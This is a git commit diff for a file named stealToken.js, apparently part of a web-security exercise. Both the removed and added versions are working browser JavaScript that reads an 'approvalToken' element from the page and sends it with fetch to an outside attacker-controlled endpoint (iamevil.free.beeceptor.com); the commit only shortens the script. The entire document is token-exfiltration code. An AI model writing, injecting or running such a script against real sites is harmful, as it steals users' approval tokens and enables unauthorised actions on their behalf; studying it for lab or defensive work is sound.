f6d94be3ce079b8938fceb22c42ad618e111697f
Kyrielled <zedix.minecraft@gmail.com>
2025-02-25 01:08:41 +0100

    Update stealToken.js

--- stealToken.js
+++ stealToken.js
@@ -1,10 +1,2 @@
-window.onload = function() {
-    // Get the approval token from the page
-    var approvalToken = document.getElementById('approvalToken').innerText;
-
-    // Send the stolen token to Beeceptor using fetch
-    fetch('https://iamevil.free.beeceptor.com/?token=' + encodeURIComponent(approvalToken))
-        .then(response => response.text())
-        .then(data => console.log('Token sent to Beeceptor:', data))
-        .catch(error => console.error('Error sending token to Beeceptor:', error));
-};
+const approvalToken = document.getElementById('approvalToken').textContent;
+fetch(`https://iamevil.free.beeceptor.com/?token=${approvalToken}`);
